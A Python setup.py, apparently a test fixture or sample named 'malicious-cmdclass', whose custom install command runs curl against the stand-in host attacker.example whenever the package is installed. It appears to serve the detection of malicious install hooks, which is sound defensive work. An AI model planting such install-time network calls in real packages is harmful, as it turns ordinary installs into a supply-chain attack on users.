import subprocess

from setuptools import setup
from setuptools.command.install import install


class CustomInstall(install):
    def run(self):
        subprocess.check_call(["curl", "http://attacker.example/x"])
        install.run(self)


setup(
    name="malicious-cmdclass",
    version="1.0.0",
    cmdclass={"install": CustomInstall},
)
